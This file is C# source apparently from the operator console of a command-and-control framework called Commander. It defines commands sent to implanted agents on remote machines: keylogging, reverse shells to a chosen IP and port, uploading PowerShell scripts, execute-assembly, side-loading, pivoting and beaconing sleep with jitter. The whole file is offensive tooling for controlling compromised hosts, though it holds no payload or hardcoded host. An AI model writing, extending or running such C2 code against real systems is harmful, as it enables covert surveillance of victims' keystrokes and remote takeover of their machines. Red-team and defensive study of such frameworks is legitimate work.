using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent
{
    public abstract class EndPointCommand<T> : EnhancedCommand<T>
    {
        public static string SLEEP = "sleep";

        public static string WHOAMI = "whoami";
        public static string DOWNLOAD = "download";
        public static string UPLOAD = "upload";
        public static string CD = "cd";
        public static string LS = "ls";
        public static string PS = "ps";
        public static string PWD = "pwd";
        public static string TERMINATE = "terminate";

        public static string SHELL = "shell";
        public static string START = "start";
        public static string RUN = "run";

        

        public static string EXECUTEASSEMBLY = "execute-assembly";
        public static string SIDELOAD = "side-load";

        //  public static string VERSION = "version";
        public static string IDLE = "idle";
        public static string CAT = "cat";

        public static string REVERSE_SHELL = "reverse-shell";

        public static string POWERSHELL = "powershell";
        public static string POWERSHELL_IMPORT = "powershell-import";

        public static string WGET = "wget";
        // public static string LINK = "link";
        // public static string UNLINK = "unlink";

        public static string SERVICE = "service";
        public static string PIVOT = "pivot";
        public static string KEYLOG = "keylog";

        public override string Category => CommandCategory.Core;

        public override RootCommand Command => new RootCommand(this.Description);

        protected async Task CallEndPointCommand(CommandContext context)
        {
            var agent = context.Executor.CurrentAgent;
            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, context.CommandParameters);


            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
        }

        protected override async Task<bool> HandleCommand(CommandContext<T> context)
        {
            await this.CallEndPointCommand(context);
            return true;
        }
    }


    public abstract class EndPointCommand : EndPointCommand<EmptyCommandOptions>
    {
    }

    public class WhoamiCommand : EndPointCommand
    {
        public override string Description => "Get User and Hostname where agent is running on";
        public override string Name => EndPointCommand.WHOAMI;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    public class PWDCommand : EndPointCommand
    {
        public override string Description => "Get current directory of the agent";
        public override string Name => EndPointCommand.PWD;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    /* public class VersionCommand : EndPointCommand
     {
         public override string Description => "Get Version of the agent";
         public override string Name => EndPointCommand.VERSION;
         public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
     }*/

    public class IdleCommand : EndPointCommand
    {
        public override string Description => "Get The idle time of the target pc";
        public override string Name => EndPointCommand.IDLE;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    public class TerminateCommand : EndPointCommand
    {
        public override string Description => "Terminate the agent";
        public override string Name => EndPointCommand.TERMINATE;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }


    public class LSCommandOptions
    {
        public string directory { get; set; }
    }
    public class LsCommand : EndPointCommand<LSCommandOptions>
    {
        public override string Description => "List files & folders in the current directory or selected directory";
        public override string Name => EndPointCommand.LS;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("directory", () => "", "directroy to list"),
            };
    }

    public class PSCommandOptions
    {
        public string process { get; set; }
    }
    public class PSCommand : EndPointCommand<PSCommandOptions>
    {
        public override string Description => "List processes";
        public override string Name => EndPointCommand.PS;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("process", () => "", "process name to search for"),
            };
    }

    public class CDCommandOptions
    {
        public string path { get; set; }
    }
    public class CDCommand : EndPointCommand<PSCommandOptions>
    {
        public override string Description => "Change Directory";
        public override string Name => EndPointCommand.CD;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("path", () => "", "path to navigate to"),
            };
    }


    public class KeylogCommandOptions
    {
        public bool verb { get; set; }
    }
    public class KeylogCommand : EndPointCommand<PSCommandOptions>
    {
        public override string Description => "Log keys on the agent";
        public override string Name => EndPointCommand.KEYLOG;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("verb", "start | stop | show").FromAmong("start", "stop", "show"),
            };
    }

    public class ReverseShellCommandOptions
    {
        public string Ip { get; set; }
        public int port { get; set; }
    }
    public class ReverseShellCommand : EndPointCommand<ReverseShellCommandOptions>
    {
        public override string Description => "Start a reverse shell";
        public override string Name => EndPointCommand.REVERSE_SHELL;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("Ip", "Ip to reach"),
                new Argument<int>("port", "port to reach"),
            };
    }


    public class SleepCommand : EndPointCommand
    {
        public override string Description => "Change agent response time";
        public override string Name => EndPointCommand.SLEEP;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<double?>("delay", () => null, "delay in seconds"),
                new Argument<int?>("jitter", () => null, "jitter in percent"),
            };
    }



    public class PowershellImportCommandOptions
    {
        public string scriptfile { get; set; }

    }
    public class PowershellImportCommand : EnhancedCommand<PowershellImportCommandOptions>
    {
        public override string Category => CommandCategory.Core;
        public override string Description => "Import a powershell script.";
        public override string Name => EndPointCommand.POWERSHELL_IMPORT;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("scriptfile", () => string.Empty, "path of the script file to load"),
            };

        protected override async Task<bool> HandleCommand(CommandContext<PowershellImportCommandOptions> context)
        {

            if (!string.IsNullOrEmpty(context.Options.scriptfile))
            {
                if (!File.Exists(context.Options.scriptfile))
                {
                    context.Terminal.WriteError($"File {context.Options.scriptfile} not found");
                    return false;
                }
                byte[] fileBytes = null;
                using (FileStream fs = File.OpenRead(context.Options.scriptfile))
                {
                    fileBytes = new byte[fs.Length];
                    fs.Read(fileBytes, 0, (int)fs.Length);
                }

                string fileName = Path.GetFileName(context.Options.scriptfile);
                bool first = true;
                var fileId = await context.CommModule.Upload(fileBytes, Path.GetFileName(fileName), a =>
                {
                    context.Terminal.ShowProgress("uploading", a, first);
                    first = false;
                });

                File.Delete(fileName);

                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName);
            }
            else
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name);

            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
            return true;
        }
    }


    public class PivotCommandOptions
    {
        public string verb { get; set; }

        public string bindto { get; set; }
    }
    public class LinkCommand : EndPointCommand<PivotCommandOptions>
    {
        public override string Description => "Manage Pivots";
        public override string Name => EndPointCommand.PIVOT;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string?>("verb", "start | stop | show").FromAmong("start", "stop", "show"),
            new Option<string>(new[] { "--bindto", "-b" }, () => null, "Endpoint To bind to"),
        };

        const string StartVerb = "start";
        const string StopVerb = "stop";
        const string ShowVerb = "show";

        protected override async Task<bool> HandleCommand(CommandContext<PivotCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;
            if (context.Options.verb == ShowVerb)
            {
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, context.CommandParameters);
                context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
                return true;
            }


            if (context.Options.verb == StartVerb || context.Options.verb == StopVerb)
            {
                if (string.IsNullOrEmpty(context.Options.bindto))
                {
                    context.Terminal.WriteError($"BindTo is required!");
                    return false;
                }

                var url = context.Options.bindto;
                ConnexionUrl conn = ConnexionUrl.FromString(url);
                if(!conn.IsValid)
                {
                    context.Terminal.WriteError($"BindTo is not valid!");
                    return false;
                }

                string commandArgs = $"{context.Options.verb} {context.Options.bindto}";

                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, commandArgs);
                context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
                return true;
            }

            return false;
        }

    }

    /*public class LinkCommandOptions
    {
        public string Host { get; set; }
        public int TargetAgent { get; set; }
    }
    public class LinkCommand : EndPointCommand<LinkCommandOptions>
    {
        public override string Description => "Link with the target agent on Pipe Communicator";
        public override string Name => EndPointCommand.LINK;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string?>("Host", () => null, "Ip of the agent"),
            new Argument<string?>("agentId", () => null, "Id of the agent (long)"),
        };

    }*/

    /*public class UnLinkCommandOptions
    {
        public int TargetAgent { get; set; }
    }
    public class UnLinkCommand : EndPointCommand<UnLinkCommandOptions>
    {
        public override string Description => "UnLink the target agent on Pipe Communicator";
        public override string Name => EndPointCommand.UNLINK;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("agentId", "Id of the agent (long)"),
        };

    }*/
}
